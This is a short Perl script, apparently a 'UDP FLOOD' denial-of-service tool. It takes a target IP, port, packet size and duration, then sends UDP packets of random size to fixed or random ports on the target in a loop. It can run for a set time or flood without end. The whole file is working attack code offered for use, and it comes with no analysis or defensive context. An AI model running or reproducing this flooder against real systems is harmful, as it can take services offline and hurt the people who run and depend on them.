#!/usr/bin/perl
##############

use Socket;
use strict;

print '
 _   _ ____  ____    _____ _     ___   ___  ____  
| | | |  _ \|  _ \  |  ___| |   / _ \ / _ \|  _ \ 
| | | | | | | |_) | | |_  | |  | | | | | | | | | |
| |_| | |_| |  __/  |  _| | |__| |_| | |_| | |_| |
 \___/|____/|_|     |_|   |_____\___/ \___/|____/         
';
print "\n";
 
if ($#ARGV != 3) {
  print "<ip> <port> <size> <time>\n\n";
  print " port=0: use random ports\n";
  print " size=0: use random size between 64 and 1024\n";
  print " time=0: continuous flood\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

 
print "==================================================\n";
print ".....SUCCESS: COMMAND HAS BEEN SENT TO SERVER.....\n";
print "==================================================\n\n";
print " | IP: $ip | PORT: $port | TIME: $time |\n\n";
print "==================================================\n";
print ".....PRESS CTRL-C TO STOP ANY RUNNING ATTACKS.....\n";
print "==================================================\n\n";
print "To cancel the attack press 'Ctrl-C'\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(65500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
